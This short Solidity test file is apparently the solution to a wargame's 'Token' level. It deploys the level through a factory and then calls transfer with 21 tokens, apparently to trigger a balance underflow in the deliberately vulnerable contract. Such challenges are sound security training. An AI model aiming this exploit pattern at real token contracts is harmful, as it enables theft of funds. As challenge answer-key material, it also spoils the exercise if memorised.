// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {TokenFactory} from "../src/levels/05-TokenFactory.sol";
import {Token} from "../src/levels/05-Token.sol";

contract TokenSolution is BaseTest {

    function solution(address payable target_) internal override{
        Token target = Token(target_);
        target.transfer(address(target), 21);
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new TokenFactory()));
    }
}
